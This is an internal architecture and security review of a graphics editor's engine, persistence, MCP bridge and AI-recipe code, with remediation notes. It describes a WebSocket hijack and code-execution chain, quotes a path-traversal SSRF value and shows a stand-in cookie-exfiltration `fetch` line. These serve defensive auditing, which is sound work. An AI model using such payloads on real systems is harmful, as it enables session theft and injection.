# Toolbox — architecture & risk review #2 (2026-07-22)

Second deep audit, following [archive/070326_architecture-review.md](archive/070326_architecture-review.md)
and the [archive/070826_riskfix-plan.md](archive/070826_riskfix-plan.md) program. Five parallel
deep-dive reviews — engine core (evaluator/gl/coerce/iterate), simulation &
heavy nodes (sim-kernel, rope/rigid/particle/watercolor/stipple/point-expression),
editor shell & UI (EffectsApp/NodeEditor/ParamPanel/spline- & paint-editor/
history), persistence & cloud (project.ts, v9 asset storage, streamed loads),
and AI recipes + MCP bridge — plus an inline re-check of the deferred Electron
hardening items. Every finding carries file:line evidence verified against the
working tree on 2026-07-22. The uncommitted source-placement-params WIP
(image-source/video/webcam) was audited as it sits; nothing below is
WIP-incompleteness. Full per-area agent reports (more detail per finding than
this synthesis) were produced during the audit; this doc is the canonical
record.

## Verdict

**The riskfix program worked where it was applied — and the same bug classes
are recurring in code written since.** Audit #1's Tier-1 list is substantially,
verifiably fixed: the texture post-pass use-after-free, the dispose-never-called
hole, per-eval transient release, the five-copy coercion table (now genuinely
single-sourced, zero drift), auth + value-vetting on the AI routes, the
save→load decode guards, `updated_at` CAS, and — the standout — the clock-store
migration, which is a real architectural success: the 10k-line shell, xyflow,
and every node chrome now sit out of playback re-renders entirely.

What this audit found is that the **enforcement gap audit #1 diagnosed is still
open, and it's now producing recurrences**, not just leftovers:

- The dispose mechanism landed — and the Particle Simulator's state keys
  violate the `<type>:<nodeId>` convention it depends on, so its dispose is
  dead code (silent, no warning).
- The transient-texture ledger landed — and coercion allocations bypass it
  entirely *and* run even on cache hits, so the ~1GB/s VRAM-churn class from
  audit #1 is still alive through a different door.
- advect-points.ts documents the consumption-gating cache hazard in a comment —
  and loop-weave shipped the exact forbidden pattern anyway.
- The CAS two-tab guard landed — and rename/visibility are blind updates that
  launder a stale window straight past it.

Meanwhile the **newest subsystems concentrate the new Tier-1 risk**: the v9
cloud-asset prune can permanently delete user media in four distinct ways; the
MCP bridge's pairing is not actually enforced server-side (any web page can
drive the editor and screenshot the canvas while `npm run mcp` is up); and the
combination of that with Point Expression's validator-time execution forms a
drive-by remote-code-execution chain. EffectsApp decomposition never happened —
the shell grew to 10.7k lines and param-controls.tsx is now the third monolith.

## Fixes applied (2026-07-22, this session)

First remediation pass. Everything below is landed in the working tree and
**verified green**: `npm run typecheck` clean, all six `check-*.mts` scripts
pass, the MCP e2e (`npm run check:mcp`) passes with two new adversarial
assertions, `node --check` on both scripts, and `npm run lint:ratchet` reports
**126 errors vs 126 baseline — zero new lint errors**.

**Landed:**

1. **MCP bridge CSWSH + SSRF (Tier-1 #2, breaks the #3 chain).**
   `scripts/mcp-server.mjs` now rejects cross-origin WebSocket handshakes via a
   loopback-only `verifyClient` Origin allowlist (browsers always attach
   `Origin`; a drive-by page can't complete the handshake) and validates the
   client's *echoed* pairing code before marking a connection paired (was: any
   `{pair:ok}` frame). `src/lib/mcp-bridge/index.ts` echoes the code.
   `scripts/mcp-source.mjs`'s version regex is anchored (`/^\d+\.\d+\.\d+$/`),
   closing the arbitrary-repo SSRF. `scripts/check-mcp.mts` gained two
   adversarial assertions (cross-origin handshake rejected; wrong code doesn't
   pair) — the cooperative-only gap the audit flagged.
2. **Point Expression global shadowing (Tier-1 #3, defense-in-depth).**
   `src/nodes/effect/point-expression.ts` shadows the network/DOM/storage/async/
   dynamic-code globals a math kernel never needs, so a naive
   `fetch("//evil/"+document.cookie)` throws (caught per-point → fails safe +
   logs) instead of exfiltrating silently. Verified: legit `Math`/env
   expressions still run; `fetch`/`document` throw. NOT a full sandbox — real
   isolation (a Worker with a time budget) is the remaining follow-up.
3. **Forward-version schema guard (Tier-1 #1e).** `deserializeGraph`
   (`project.ts`) and `readProjectFile` (`project-file.ts`) throw a typed
   `NewerSchemaError` when a project's schema exceeds `CURRENT_SCHEMA`, instead
   of silently dropping unknown fields and (under v9) pruning the Storage
   objects only the newer envelope shapes reference.
4. **Particle Simulator dispose resurrected (Tier-1 #6).** State keys renamed
   to start with the registered type (`particle-simulator:<id>` /
   `…:<id>:webgpu`) so the evaluator's dispose sweep actually reaches them —
   the old `particle-sim:` prefix made dispose dead code and leaked GPU state
   per add/delete. Session-only state, no save migration.
5. **`sweepNodeState` guardrail.** The sweep now warns once per unregistered
   state-key prefix — the exact convention break that hid the particle-sim
   leak is now loud (`sim-zone` and `__…__` allowlisted).
6. **loop-weave stale-empty aux (Tier-1 #5).** Builds `orbits`/`skipped`
   unconditionally instead of gating on `consumedOutputs` — a caching node
   can't gate an output on consumer existence (not in the fingerprint) without
   serving empty forever once wired. Follows the advect-points precedent.
7. **CAS on rename / visibility (Tier-1 #1d).** `renameProject` and
   `setProjectVisibility` take `expectedUpdatedAt` and compare-and-swap like
   `updateProject`, returning `conflict` — so a stale window's rename/flip
   conflicts instead of laundering a fresh `updated_at` past the next save's
   CAS. Call sites surface the same "saved from another window" message.
8. **Blank second viewport (editor quick win).** `viewportSplit` added to the
   state-driven eval effect's deps so toggling split paints the second canvas
   immediately.
9. **Cloud-prune failed-stream data loss (Tier-1 #1b) + a test harness.**
   `resolveAssetRefs` now preserves `asset`/`ext` on the resolved envelope
   (`project-assets.ts`), so a stream that resolves to a Storage URL and then
   fails to decode stays recognizable as an asset ref; `rewriteNodeToRefs`
   recognizes such a ref, adds it to the keep-set (prune spares it), and stores
   a clean `{asset, ext}` row ref; `PendingMedia.envelope` carries the fields.
   The parallel `.toolbox` URL leak is closed (`project-file.ts` strips the
   transient Storage URL rather than embedding it in a supposedly-offline
   file). Verified by **`scripts/check-persistence.mts`** — a faked
   Storage-client harness (the guardrail the v9 specs called for), now wired
   into `npm run check` (CI gate): it asserts the inline→ref path, the
   asset/ext preservation, the failed-stream keep-and-spare (the load-bearing
   "prune does not delete the still-referenced object"), genuine-orphan prune,
   and the forward-version throw.

10. **Prune concurrency race (Tier-1 #1c).** `uploadGraphAssets` now returns
   its pre-upload listing as `existingBefore`, and `pruneProjectAssets` prunes
   only from that snapshot (`snapshot − keep`) instead of re-listing at
   execution time. An object a concurrent save uploads *after* our snapshot is
   never a prune candidate, so our unawaited, possibly-late prune can't delete
   it — closing the documented interleaving. The snapshot is listed
   unconditionally now (even a media-free save needs it to prune orphans left
   when the last media was removed). Verified by two new
   `check-persistence.mts` assertions: the snapshot orphan is still pruned, and
   the concurrently-uploaded asset absent from the snapshot survives.
11. **Doc-accuracy fixes.** loop-weave's header comment ("only built when
   consumed") corrected to match the #5 fix; simulation-start's dispose comment
   (falsely claiming End releases zone textures — it doesn't) corrected to
   document the real deferred leak (#6).
12. **Composition-scoped `createLayer`/`reorderLayers` (editor Tier-1 #1).**
   Both take an optional `compositionId` and scope the target Output via the
   existing `belongsToComposition` helper (backward-compatible — `undefined`
   keeps old behavior), and `createLayer` tags the new boundary nodes into that
   composition. All nine EffectsApp call sites now pass
   `activeCompositionIdRef.current`, so "Add layer" / drop-source / paste /
   reorder in a multi-composition project can no longer rewire ANOTHER
   composition's Output. Verified by a new pure-module harness
   **`scripts/check-graph-ops.mts`** (in the CI `check` chain): each test lists
   the *wrong* composition's Output first, so an unscoped regression fails.
13. **Synchronous export-busy lock (editor Tier-1 #2).** A new `exportBusyRef`
   is taken synchronously in the `effect-node-export` dispatcher around the four
   offline export kinds (image/video/sequence/gif), so a double-clicked Export
   button's second event bails immediately instead of starting a second
   overlapping offline render (which fought over `offlineRenderingRef` + the
   time save/restore). `recordingRef` alone couldn't guard this — it lags the
   React commit.
14. **Sim advance gate — particle-webgl (sim audit #2/#3).** Rope and Rigid
   Body already carry the house-contract gate
   (`active = ctx.playing || (ctx.offline && ctx.time > st.lastTime + 1e-6)`,
   then `stepCount = active ? substeps : 0`). Applied the same gate to the
   default WebGL particle backend: it now runs the step pass only when
   `active || reset` and re-emits the current read state otherwise, so an
   offline export's settle re-render (and split view's 2nd pass) no longer
   double-steps the sim. The reset (time-wrap) path still runs even when
   paused. particle-**webgpu** is left with a pointer comment — its
   frame-behind async readback makes the gate non-trivial and it's an opt-in,
   in-progress backend. *User-verified against a real export.*
15. **Save-during-stream stale-`nodesRef` (Tier-1 #1a).** A `landedMediaRef`
   (nodeId→param→value) records each streamed image synchronously as it lands;
   `overlayLandedMedia` patches those onto the graph at serialize time (all
   three serialize sites), so a Cmd+S that awaits the stream but resumes before
   React commits the last patch no longer serializes the image as null (which
   would then be pruned — the #1b loss via a different door). A cleanup effect
   drops each entry once it's committed, so a later user edit of the param
   isn't clobbered. *User-verified by saving while per-node spinners are up.*

**Deferred — need runtime verification I can't do headless, or a design
decision (do these against a running app / real Supabase):**

- **Streamed-media identity refactor (Tier-1 #1f).** Keeping the envelope as
  the param value through undo/docs-stash while pending (never null) is the
  architectural fix; #1a (the save race) and #1b/#1c (prune) are now closed, so
  #1f is the remaining streamed-media integrity gap (undo/stash mid-stream).
- **particle-webgpu advance gate.** The opt-in WebGPU backend still
  double-steps on settle; deferred pending a real WebGPU device to verify the
  frame-behind readback interaction (pointer comment in the file).
- **Session stash on auth change (editor Tier-1 #5).** A bare
  `clearEditorSession()` is insufficient (the live editor also retains the
  prior account's project on account switch) and "what happens to unsaved work
  on sign-out" is a product decision; needs the real auth flow to verify.

## Scorecard — audit #1 items, verified today

**Fixed and verified** (with current evidence): post-pass texture UAF
(`NodeOutput.ownsTextures`, types.ts:789-800; evaluator.ts:1358-1391) ·
transient release for uncacheable node outputs (evaluator.ts:153-161, 1406-1432)
· dispose sweep + backend-teardown dispose (evaluator.ts:442-477, 1520) ·
coercion single-source, no sixth copy anywhere (graph-validation.ts:62-149;
consumers NodeEditor.tsx:954/1560/1605, EffectsApp.tsx:3243) · clock store
steps 1-3 (state/playback-clock.ts; shell holds no clock state) ·
memo(EffectNode/NodeEditor/ParamPanel) + stable handler identities ·
edge-pruning `return prev` · load-path decode guards + catch/toast + snapshot
after success · original-bytes serialization (lib/image-bytes.ts) ·
`control:"font"` bundle dedup · size preflight (projects.ts:15-24) ·
`updated_at` CAS on saves (projects.ts:336-345) · AI route auth/401 +
gated env-key + maxDuration · `vetParamValue` in all three mutation paths
(build/edit/MCP) · edit-path exposedParams mirroring · commit-race re-derive
(EffectsApp.tsx:2998-3019) · TrackEditor NUL bytes · CI + lint ratchet ·
Electron: same-origin nav guard (main.js:42-43), fork env allowlist, preload
origin gate, ffmpeg killAllSessions.

**Still open from audit #1** (each re-verified, evidence in the tiers below):
texture free-list pool (the devguide's "pool" is still fiction) · full alloc
ledger (coercion temps, compute-throw intermediates) · sim-zone state teardown
· engine per-eval CPU (stableStringify per node per eval, O(sockets·E) edge
scans, unconditional flatten+toposort) · EffectsApp decomposition phases 1-5 ·
`applyLoadedProject` unification · `selectNode()` helper · synchronous
export-busy ref · `viewportSplit` eval dep · composition-scoped
createLayer/reorderLayers · project-load history pinning · paint-undo
ImageData budget · session stash on auth change · `Object.freeze` dev guard ·
forward-version schema guard · def-driven param default fill · `active2`/
`linkedParams` serialization · server-side catalog build · rate limiting ·
AbortSignal/Cancel · autosave/beforeunload · Electron CSP, permission handler,
single-instance lock, realpath assets check, capped did-fail-load retry
(main.js:122-124 still retries every 500ms forever).

---

## Tier 1 — fix now

### 1. The v9 cloud-asset prune can permanently delete user media (four routes in)

The content-addressed Storage design is right, but every save's post-CAS prune
(`projects.ts:353-355` → `project-assets.ts:224-238`) deletes anything under
the project prefix that the just-serialized graph doesn't reference — and four
verified paths produce a graph that under-references:

- **(a) Save during a streamed load reads a stale `nodesRef`.** `saveToRow`
  awaits the stream batch (EffectsApp.tsx:7200) then serializes
  `nodesRef.current` (:7203-7205) — but the batch promise resolves in a
  microtask after the last fetch, *before* React commits the last
  `setNodes` patch (:550-563; ref mirror :1393-1394). Cmd+S while per-node
  spinners are visible ⇒ the last-landing images serialize as `null`, drop out
  of `keepFilenames`, and the prune deletes their Storage objects.
  `handleSaveToFile` (:7547) has the same stale read (broken `.toolbox`, no
  prune).
- **(b) A failed stream's kept envelope is invisible to the upload path.** On
  stream failure the param keeps `{kind:"file", dataUrl:"https://…"}`
  (EffectsApp.tsx:568-572), but `rewriteNodeToRefs` only recognizes
  `data:`-prefixed inline assets (asset-envelope.ts:14-23;
  project-assets.ts:152-166) — the asset is never re-added to the keep-set, so
  the next save prunes the object the row still points at. One transient fetch
  hiccup ⇒ permanent 404. The `.toolbox` writer has the same blind spot
  (project-file.ts:107-108): Save-to-File after a failed stream embeds a live
  Supabase URL in a supposedly offline file.
- **(c) Prune races concurrent uploads.** Prune is fired-and-forgotten and
  lists the prefix *at execution time* (project-assets.ts:230): save 1's slow
  prune can list-and-delete an asset save 2 uploaded moments ago — same
  window, no second tab needed.
- **(d) Rename/visibility launder a stale window past the CAS.**
  `renameProject` (projects.ts:365-381) and `setProjectVisibility` (:383-427)
  are blind updates that mint a fresh `updated_at` the stale window adopts —
  its next save passes CAS, silently clobbers the other window's save, and
  its prune deletes the assets that save uploaded.

Compounding both directions: **(e) no forward-version guard** (unchanged from
audit #1, but v9 raised the stakes: an older client re-saving a newer-schema
row now also prunes Storage objects referenced by envelope shapes it doesn't
recognize), and **(f) streamed media has no persistent identity while
pending** — undo snapshots and the docs-stash capture `null` params mid-stream,
and restoring one then saving triggers the same prune-loss. Video/audio
already solved (f) correctly with `__missingMedia` marker keys in params
(media-relink.ts:16-20); the class fix is to keep the envelope (with
`asset`/`ext`) as the param value until the bitmap replaces it, which subsumes
(a), (b), and (f).

### 2. MCP bridge: the pairing code is theater against a programmatic client (CSWSH), plus an SSRF

- `scripts/mcp-server.mjs:51` starts the WebSocketServer with no
  `verifyClient`/Origin check. WebSockets are exempt from same-origin policy,
  so while `npm run mcp` is up, **any web page in any browser** (and any local
  process) can connect to `ws://127.0.0.1:38275`. The server *sends* the
  4-digit code to the connecting client (`hello`, :66-68) and marks the
  connection paired on **any** `{type:"pair",ok:true}` frame without validating
  the echoed code (:77-82); last-connected wins (:53-63), so a rogue client can
  boot the real editor. Blast radius via the command registry
  (mcp-handlers.ts): arbitrary graph mutation (`insert_recipe`/`edit_group`/
  `set_param`), project exfiltration (`get_graph`), and **canvas exfiltration**
  (`screenshot`/`screenshot_strip`).
- `scripts/mcp-source.mjs:186`: the version regex `/^\d+\.\d+\.\d+/` is not
  end-anchored and `appVersion` is client-supplied — verified:
  `"1.0.0/../../../evil-user/evil-repo/main"` passes and URL-normalizes to an
  **arbitrary GitHub repo**, which the server then serves back to Claude as
  authoritative "toolbox source" (source-substitution injection). Fix: anchor
  the regex, reject `/` in `appVersion`.

### 3. AI-authored code executes before anyone reviews it — and #2 makes it reachable by a web page

Point Expression compiles user/AI-authored JS with a bare `new Function`
(point-expression.ts:315-324) — `"use strict"` shadows nothing that matters:
`fetch`, `document`, `localStorage`, `globalThis` are all reachable, and
there's no loop guard or worker isolation (a `while(true)` hangs the main
thread). Critically, `validateParams` **smoke-runs the compiled kernel during
recipe validation** (:716-733) — i.e. a hostile expression in a generated
recipe executes *before* the user reviews or applies anything. Chained with
finding #2: a malicious web page pairs with the MCP bridge and calls
`insert_recipe` with a Point Expression node — the validator executes the
attacker's JS in the editor tab with no user interaction. Minimum hardening:
run the validation smoke-run (ideally per-point eval) in a worker with a
timeout, and shadow the obvious globals as `undefined` kernel params. The
client-supplied `catalog` prompt injection (audit #1 §2) also remains open —
server-side catalog build is still deferred (generate-recipe/route.ts:36-55).

### 4. Coercion allocations bypass the transient ledger — and run even on cache hits

Input resolution, including `coerceValue`, runs unconditionally for every
needed node *before* the fingerprint check (evaluator.ts:929, :1019 vs cache
check :1267). So on every eval — including fully-cache-hit frames:

- `mask↔image` coercions allocate a fresh full-canvas texture per coerced wire
  per eval, registered nowhere (coerce.ts:136-156) — the audit-#1 VRAM-churn
  class, alive because coercions aren't node outputs and the transient ledger
  only sees node outputs.
- `image/mask→scalar` does a synchronous GPU readback stall every eval
  (coerce.ts:183-187), not "when a consumer requests it" as the comment says.
- `element→image` leaks one canvas texture per frame to GC for animated
  elements (element.ts:338-377; Text's element aux mints a new identity per
  frame).

Fix direction: defer input coercion to the cache-miss branch, plus a
`ctx.registerTransient` hook coerce.ts pushes into. (The texture "pool" also
still isn't one — gl.ts:341-408 raw-creates, :478-480 raw-deletes; the
free-list + lease counter from audit #1 remains the enabling guardrail.)

### 5. Consumption-gating without a fingerprint contribution serves stale-empty outputs

Three symptoms, one root cause — a consumer's existence isn't part of the
producer's fingerprint, so cacheable nodes that gate work on
`consumedOutputs` serve entries built before the consumer existed:

- **loop-weave** (no `stable:false`) gates `aux:orbits`/`aux:skipped`
  (loop-weave.ts:376-384): wire `orbits` into anything after first eval and
  the consumer reads an empty spline *forever* until an unrelated edit busts
  the fp. advect-points.ts:41-47 documents this exact hazard as the reason it
  builds unconditionally.
- **Iterate collect taps never mark tapped handles consumed** (nested eval
  marks only `primary`/`aux:image`, evaluator.ts:782-786; shell passes no
  `extraConsumed`, iterate.ts:308-320): tapping Text's `spline` aux or the
  sims' `points`/`tears`/`bodies`/`snaps` collects empty on *every* iteration.
  ~10-line fix.
- **Socket peek can't defeat a cache hit** on a cacheable gating node
  (EffectsApp.tsx:1764-1777) — same root cause.

Same family: **Stipple's bake staleness check uses raw texture identity**
(`state.relaxResultSrc !== src.texture`, stipple.ts:890-891) — the devguide
explicitly forbids this, citing Text, and indeed animated Text → packed
Stipple freezes the dot layout while the text moves. The sim-kernel's
collider/map caches (sim-kernel.ts:307, :503) key on value identity, which
Text *also* defeats (it re-renders into the same `state.primary` object,
text.ts:630, 1364-1368) — the devguide's own "value-object identity is sound"
rule is broken by Text and needs the exception documented.

### 6. Simulations vs. time: exports diverge from preview, split view runs 2×, and two leaks

- **Offline export double-steps every CPU sim on every settled frame.** The
  export drivers re-render the same `t` when anything settles
  (EffectsApp.tsx:6227-6231 + four more sites); Rope/Rigid/particle advance
  `substeps × fixedDt` on *every compute* (rope-simulator.ts:958-1136,
  rigid-body-simulator.ts:1416-1492, particle-simulator-webgl.ts:1039). Any
  export containing settles (video seek, audio decode, EXR, ML bakes) runs
  the sims at a varying 1-2× rate — jerky, non-reproducible, never matching
  preview. Watercolor already has the correct gate
  (`ctx.playing || (ctx.offline && time advanced)`, watercolor-ink.ts:909-916);
  the other three need it (~3 lines each). Also: `startFrame > 0` exports
  never trip the time-wrap reset, so they inherit whatever sim state the
  preview session left behind.
- **Split viewport issues a second `evaluateGraph` on the same state per
  frame** (EffectsApp.tsx:1869-1888) — sims advance twice per frame whenever
  visible in both panes. The same time-gate fixes it.
- **Particle Simulator dispose is dead code**: state keys are
  `particle-sim:`/`particle-sim-webgpu:` (particle-simulator-webgl.ts:466-468,
  particle-simulator-webgpu.ts:182-184) but the sweep only matches keys whose
  prefix is a *registered node type* (`"particle-simulator"`,
  evaluator.ts:456-457) — deleting the node orphans 4 textures + 2
  framebuffers (WebGL) or GPU buffers (WebGPU) per instance for the session.
  Two string renames fix it (session-only state, no migration).
- **Sim-zone deletion still strands two full-canvas RGBA16F ping-pongs**
  (~33MB/zone at 1080p) until backend teardown — known-deferred, but
  simulation-start.ts:320-327's dispose comment claims the End node handles
  it while simulation-end.ts:183-189 is also a no-op. Fix the false comment
  or land the teardown.

### 7. Editor shell — carried Tier-1s, all still live

All previously flagged, re-verified today, still unfixed:

- **Cross-composition graph corruption**: `createLayer`/`reorderLayers` still
  find the first root Output over the whole array (graph-ops.ts:1469-1476,
  :1807-1835) with unscoped call sites (EffectsApp.tsx:2598, 3067, 3654, 5803,
  5829) — dropping an image on the canvas with comp B active wires the new
  layer into comp A's Output.
- **Double-click Export starts two overlapping exports** (only guard is the
  render-lagging `recordingRef`, :5495-5496 vs :6067).
- **Graph fully editable during offline export** — no scrim exists; edits at
  frame 400 of 900 are captured into the file, structural edits can throw
  mid-loop.
- **Session stash resurrects the previous account's project** across
  sign-out/sign-in (only clear site is File→New, :7965).
- **Undo memory unbounded in practice**: every project load pushes the whole
  outgoing project into history (:7478, :7700) and paint undo stores full
  uncompressed ImageData both directions (history.ts:96-127; ~33MB/entry at
  4K).
- **Blank second viewport** toggling split while paused (`viewportSplit`
  missing from eval deps, :1923-1933) — the one-line audit-#1 quick win.

---

## Tier 2 — structural

### Monoliths: the decomposition didn't happen; the count is now three

EffectsApp grew 9.6k → **10,664** lines *despite the clock migration removing
code* (43 useState / 56 useRef / 49 useEffect / 132 useCallback). Growth:
wedge batch drivers, socket-peek plumbing, MCP wiring, iterate gestures, pie
menu, MessageConsole, assets view. `onParamChange` alone is a ~400-line
multi-concern reducer (:4081-4483) that is pure-extractable in the graph-ops
style. **param-controls.tsx (5,747, +1,013 since 07-04, 60+ exports, no
internal boundaries) is the fastest-growing UI file** — the phase plan from
audit #1 §8 remains the right shape, now with param-controls as a phase of its
own. Counterpoint worth naming: **graph-ops.ts (+584 lines) is the one good
growth** — purity verified (all `.data.*` writes on freshly-minted nodes), and
the new module dirs (spline-editor/, paint-editor/) are architecturally sound
with exact listener add/remove parity. The extraction pattern works when used.

### Playback perf: the remaining storm is the dock (and the engine's CPU side)

The clock store moved the shell/xyflow/EffectNode out of per-frame renders —
but all six clock consumers subscribe at component top, so with the timeline
open, TrackEditor (3,235 lines, two full `lanes.map` passes), GraphEditor,
LayersEditor, and ParamPanel each re-render 60×/s during playback and per
pointermove while scrubbing. The spec'd leaf-subscription pass
(`<Playhead/>`, per-diamond subscriptions) is the highest-value perf item
left in the UI. Shell side: `structFp` still deep-fingerprints every param of
every node on every nodes/edges identity change (:1639-1655), and the errors
effect returns a fresh array unconditionally (:2008-2017). Engine side, all
three audit-#1 items remain: per-node stableStringify per eval
(evaluator.ts:502/511), O(sockets·E) edge scans ×3 sites, unconditional
flatten+toposort (flatten.ts:37-39 — the early-out never fires post-v4), plus
the Iterate stash re-stringifying every member per eval even on shell cache
hits (:636-663).

### Iterate: three architectural gaps beyond the Tier-1 tap bug

Its state model assumes exactly one outer EvalCache per backend — compute
frees `state.owned` on entry (iterate.ts:172-175), which is a latent
use-after-free the moment a second cache evaluates the same graph
(transientsByCache already anticipates multiple caches; iterate doesn't).
The stash hash omits member `clips` and folds the *global* tick even under a
pinned pre-roll clock (evaluator.ts:639-655) — stale collections at clip
edges, and pre-roll warm-caching defeated for time-driven zones. Image
collection resamples sub-canvas taps to full canvas (iterate.ts:335-341,
should be `allocImage({width,height})` — same inconsistency as `applyMask`,
evaluator.ts:95, vs `applyOpacity`, :78).

### Invariant #1's stated mechanism is stale

Engine/nodes have **zero** imports from src/components or src/state (clean),
but **ten `@/lib` import sites across 9 files** (text-raster, text, audio,
image-generate, point-labels, points-to-text, segment, depth-anything, lut).
These work in exported apps only because the export template aliases `@/lib`
to the full lib tree (export-template/vite.config.ts:26-38) — the devguide's
"copies the engine subtree verbatim / nothing may import from src/lib" no
longer describes reality, and nothing enforces that the imported modules stay
dependency-light. Either re-scope the invariant (an allowlist of browser-pure
lib modules) or move those helpers engine-side.

### Persistence: duplication and round-trip lossiness

The extract pipeline exists twice (`writeProjectFile` vs
`uploadGraphAssets`/`rewriteNodeToRefs`) and the ref shapes have already
drifted (cloud refs carry `ext`, `.toolbox` refs don't) — Tier-1 1(b) is a
direct consequence; unify on asset-envelope. Two param types are lossy today:
`image_sequence`'s descriptor is destroyed by the first load→save cycle
(serialized project.ts:420-442, deserialized to null :582-586) and
`model_file` has no deserialize branch at all (gone by the second save).
Streamed loads only defer `kind:"file"` — a Storage-hosted EXR still blocks
load synchronously. Error surfacing across the load/save path is
console-only (failed decodes, failed streams, the silent inline-storage
fallback) despite the missingMedia report pattern fitting all of them. And
`loadedCache` isn't auth-scoped; the `/p/<slug>` path doesn't carry
`updated_at`, so owner saves from a public link bypass CAS.

### AI subsystem: what's still structurally open

globalThis segment/depth session stores have no project-switch lifecycle
(segment-session.ts:105-114, depth-session.ts:90-99) — stale bakes count
against the new project's 512MB budget and 6-char node-id collisions can
serve the previous project's masks. `history`/`repair` are unbounded
server-side (edit-recipe/route.ts:36) and `buildRecipe` has no MAX_NODES
guard. No rate limiting anywhere (up to 3 Opus calls × 5 min per action,
nothing throttling repeats), no AbortController, no Cancel button. The
check-*.mts suite is good but tests only the cooperative client — none of
the Tier-1 #2 adversarial cases (wrong pairing code, hostile appVersion,
symlink in scope) are covered.

### Sim-kernel parity: one undocumented divergence

Force fields match the GLSL formula-for-formula (verified, including the
Ashima noise port), but the CPU contact response scales restitution by
per-particle bounciness and applies `(1−friction)` tangential damping
(sim-kernel.ts:338-353) — the particle shader has neither, so the same
collider node behaves differently in rope/rigid vs particle sims at any
non-neutral material. Fine as a design choice; document it or neutralize
defaults.

### Undo granularity

Coalescing is time-based (700ms keyed `param:<node>:<param>`, history.ts:74-85)
while spline editing routes every drag frame through `onParamChange` — two
pen clicks <700ms apart merge (undo eats anchors); a paused drag splits. Only
pencil/shape deliver the specced one-undo-per-gesture. Fix: per-pointerdown
coalesce keys.

### Electron (inline re-check)

Landed 07-09 and verified still present: same-origin nav guard on both
navigate events (main.js:42-43), preload origin gate, fork env allowlist,
ffmpeg killAllSessions. **Still absent**: CSP (`onHeadersReceived` — no hits),
`setPermissionRequestHandler`, `requestSingleInstanceLock`, realpath check in
assets.read, and the embedded-server `did-fail-load` retry is still unbounded
at 500ms (main.js:122-124). CSP + permissions matter more now than in July:
Tier-1 #3 shows the app executing model-authored JS, and the desktop bridge
is the richest post-XSS surface.

---

## Quick wins (≤ a day each, ranked by risk retired)

1. **MCP server**: Origin allowlist + validate the echoed pairing code
   (mcp-server.mjs:51, :77-82); anchor the version regex + reject `/`
   (mcp-source.mjs:186). Closes Tier-1 #2 and breaks the #3 chain.
2. **Storage-URL envelopes first-class**: `resolveAssetRefs` keeps
   `asset`/`ext`; `rewriteNodeToRefs` recognizes them (closes 1(b) incl. the
   `.toolbox` leak). Plus: prune from the save-time list snapshot (1(c)), CAS
   on rename/visibility (1(d)).
3. **Forward-version guard** in `deserializeGraph` + `readProjectFile` (~10
   lines; 1(e)).
4. **Particle-sim state-key rename** to `particle-simulator:<id>…` (Tier-1
   #6); fix the false sim-zone dispose comment.
5. **Offline/split advance gate** in rope/rigid/particle (copy
   watercolor-ink.ts:909-916).
6. **loop-weave builds aux unconditionally** (advect precedent); **iterate
   passes `extraConsumed`** for taps.
7. **`viewportSplit` eval dep** (1 line) · **synchronous exportBusyRef** (copy
   relinkBusyRef) · **input scrim during offline export** ·
   **`clearEditorSession()` on auth change** · **stop pushing history on
   project load**.
8. **compositionId through createLayer/reorderLayers** (getLayerChain shows
   the pattern).
9. **Stipple bake key**: value-object identity or input fingerprint instead of
   raw texture identity.
10. Cap `history`/`repair` + MAX_NODES server-side; Cancel button +
    AbortController through the AI clients.
11. Toasts for stream/decode failures and the silent inline-save fallback;
    save busy-ref (double Cmd+S currently self-triggers the conflict toast).
12. Remove (or wire) the never-called `init?` hook (types.ts:1311); delete the
    redundant `t:` fingerprintExtras on the four stable:false sims.

## Guardrails — the recurrence problem

Audit #1's diagnosis ("conventions outrunning enforcement") produced CI, and
CI is working — but every headline Tier-1 in *new* code is a documented
convention that nothing checks. The particle sim broke a naming convention the
dispose sweep silently depends on; loop-weave shipped a hazard another node
documents in a comment; coercions bypassed a ledger that only watches node
outputs. The cheapest mechanical answers, in order:

1. **Dev-mode GPU lease counter** (the audit-#1 free-list pool, or even just
   an alloc/release counter with an end-of-eval delta warning). Would have
   caught Tier-1 #4 *and* #6's dispose dead code at first playback.
2. **`sweepNodeState` warns on unregistered state-key prefixes** (~5 lines).
   Directly converts the particle-sim class from silent leak to console error.
3. **A def-lint check script** (the check-*.mts pattern, runs in CI): defs
   that read `consumedOutputs` must be `stable:false` or declare a
   consumed-set fingerprint extra; state keys must start with the def's type;
   declared aux types must match what compute emits. All statically checkable
   against the registry.
4. **Persistence round-trip tests**: serialize→deserialize→serialize
   byte-stability, envelope keep-set coverage, forward-version rejection —
   both v9 specs already listed these; nothing runs them.
5. **Adversarial cases in check-mcp.mts**: wrong pairing code rejected, bad
   `appVersion` rejected, symlink escape rejected — the suite currently only
   proves the cooperative path works.
6. **Vitest for the pure modules** (graph-ops, layout, keyframes,
   graph-validation, float-curve, spline math) — still the standing
   recommendation; the modules stayed pure, so the cost hasn't grown.

## Devguide corrections (061226_devguide.md)

Consolidated from all five reviews:

- **Monolith sizes** (flagged in audit #1, still stale): EffectsApp ~7.2k →
  **10.7k**; ParamPanel ~5.6k → **2.9k**; the second monolith is
  **lib/param-controls.tsx (5.7k)**; TrackEditor 3.2k.
- **Repo map still says "SavedProject SCHEMA (v4)"** — CURRENT_SCHEMA = 9;
  the doc is internally inconsistent (Persistence section says 9).
- **The "texture pool" language is still fiction** (gl.ts entry + §Caching) —
  raw create/delete, no free-list, no lease counter.
- **Invariant #1's mechanism**: the export bundle Vite-builds from live source
  with `@/lib` aliases; ten engine/node files import `@/lib` today. Re-scope
  or fix.
- **§Caching**: document `NodeOutput.ownsTextures` and the per-cache
  transient-release scheme (they're invisible to a new node author today);
  amend "value-object identity is sound" with the Text exception (re-renders
  in place into the same value object) — Stipple and the sim-kernel caches
  lean on the unsound form.
- **`ctx.state` key format is load-bearing** — the dispose sweep resolves the
  prefix via the registry; a mismatched prefix silently disables dispose.
  Note the particle-sim violation until renamed.
- **`init` hook**: listed in the anatomy, never invoked anywhere. Remove or
  wire.
- **Master clock**: now lives in `src/state/playback-clock.ts`
  (useSyncExternalStore; EffectsApp holds no clock state); the state/ repo-map
  entry omits the file entirely.
- **CONNECTED_TYPE_RETYPE_NODES** is five entries (incl. `scatter-points`) —
  the narrative names four.
- **Duplicated data-url.ts paragraph** (lines ~599 and ~614) — the second is a
  stale shorter revision; delete it.
- **"A stream that fails keeps its envelope so the ref still round-trips"** —
  false until Tier-1 1(b) is fixed (the ref round-trips; the next save prunes
  the object it references).
